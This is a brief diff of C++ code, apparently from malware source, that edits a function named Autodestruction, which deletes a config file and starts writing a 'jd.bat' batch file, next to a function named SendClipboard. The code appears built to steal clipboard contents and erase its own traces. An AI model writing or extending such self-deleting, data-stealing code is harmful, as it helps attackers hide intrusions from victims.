@@ -345,7 +345,7 @@ void SendClipboard(std::string) {
 }
 
 void Autodestruction(std::string) {
-    tools::remove(DATA_FILENAME);
+    tools::remove(CONFIG_FILENAME);
     std::ofstream f;
     std::string temp_filename = "jd.bat";
     f.open(temp_filename);
